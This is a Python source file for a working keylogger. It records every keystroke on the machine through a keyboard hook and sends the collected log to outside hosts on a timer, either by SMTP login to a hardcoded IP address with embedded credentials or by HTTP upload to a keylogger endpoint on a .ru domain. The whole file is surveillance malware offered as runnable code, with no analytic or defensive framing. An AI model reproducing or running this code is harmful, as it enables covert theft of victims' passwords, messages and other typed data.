import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import requests
import time

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "test@meres.testkey.ru"
EMAIL_PASSWORD = "test1234"


class Keylogger:
    def __init__(self, interval, report_method="email"):

        self.interval = interval
        self.report_method = report_method

        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:

            if name == "space":

                name = " "
            elif name == "enter":

                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:

                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog_{start_dt_str}_{end_dt_str}"

    def report_to_file(self):

        with open(f"{self.filename}.txt", "w") as f:

            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        url = 'https://api.mysdo.ru/keylogger/logs'

        self.files = {'file': open(f"{self.filename}.txt", 'rb')}

        self.req = requests.post(url, files=self.files)

    def sendmail(self, email, password, message):

        server = smtplib.SMTP('37.140.192.194')

        server.starttls()

        server.login(email, password)

        server.sendmail(email, email, message)

        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()

            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True

        timer.start()

    def start(self):

        self.start_dt = datetime.now()

        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    #def report(self):

        #time.sleep(15)
        #url = 'https://api.mysdo.ru/keylogger/logs'

        #self.files = {'file': open(f"{self.filename}.txt", 'rb')}

        #self.req = requests.post(url, files=self.files)


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()

